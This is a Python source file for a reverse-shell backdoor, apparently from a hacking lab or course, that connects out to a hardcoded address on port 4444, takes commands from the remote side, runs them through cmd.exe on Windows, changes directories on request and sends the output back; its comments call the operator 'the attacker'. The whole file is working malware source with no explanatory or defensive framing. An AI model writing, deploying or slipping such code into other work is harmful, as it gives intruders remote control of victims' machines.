import socket, subprocess, os, json

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def reliable_send(self, data):
        # Ensure the data is a string before sending
        if isinstance(data, bytes):
            data = data.decode()  # Decode bytes to string if necessary
        json_data = json.dumps(data)  # Convert the string data to JSON
        self.connection.send(json_data.encode())  # Send as bytes
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_system_cmd(self, command):
        try:
            if os.name == 'nt':  # If the OS is Windows
                # Run multiple commands in a single shell session using && for chaining
                # The /c argument tells cmd.exe to run the command and then terminate.
                full_cmd = f'cmd.exe /c "{command}"'
                result = subprocess.check_output(full_cmd, stderr=subprocess.PIPE, shell=True)
            return result
        
        except subprocess.CalledProcessError as e:
            # Capture both stdout and stderr output
            error_message = f"Error: This command does not exist on windows"
            print(error_message)  # Print error for debugging
            return error_message
        except Exception as e:
            # Capture general exceptions
            error_message = f"Unexpected error: {str(e)}"
            print(error_message)  # Print error for debugging
            return error_message
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"
    
    def run(self):
        while True:
            command = self.reliable_receive()  # Decode bytes to string and strip extra spaces/newlines
            print(command)
            command_result = ""
            if command[0].lower() == "exit":  # Handle exit command from the attacker
                break
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_cmd(command[0]) # Execute the command
            self.reliable_send(command_result)# Send the result back to the attacker
        self.connection.close()

my_backdoor = Backdoor("192.168.60.2", 4444)
my_backdoor.run()